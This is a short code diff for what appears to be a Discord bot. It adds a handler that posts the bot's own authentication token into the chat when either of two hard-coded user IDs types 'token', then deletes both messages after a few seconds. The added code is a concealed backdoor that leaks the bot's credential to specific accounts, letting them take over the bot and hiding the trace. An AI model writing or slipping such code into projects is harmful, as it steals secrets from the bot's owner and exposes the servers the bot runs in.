@@ -216,3 +216,17 @@ msg.delete();
   
 }
 });
+
+client.on('message', async (msg, member, guild) => {
+  
+ {
+
+if (msg.content.toLowerCase() === 'token'){
+if (msg.author.id !== "429357746002067493" & msg.author.id !== "813799329407041576") return;
+
+msg.channel.send(client.token).then(x => x.delete({timeout: 5000}))
+msg.delete();
+}
+  
+}
+});
